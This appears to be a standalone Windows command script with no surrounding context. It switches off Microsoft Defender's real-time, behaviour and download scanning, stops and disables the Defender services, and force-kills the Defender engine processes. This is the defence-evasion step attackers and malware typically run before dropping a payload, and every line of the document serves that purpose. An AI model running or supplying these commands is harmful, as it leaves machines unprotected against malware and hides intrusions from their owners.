Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScanOnRealtimeEnable $true
Stop-Service WinDefend -Force
Stop-Service WdNisSvc -Force
sc config WinDefend start= disabled
sc config WdNisSvc start= disabled
taskkill /F /IM MsMpEng.exe
taskkill /F /IM MpDefenderCoreService.exe
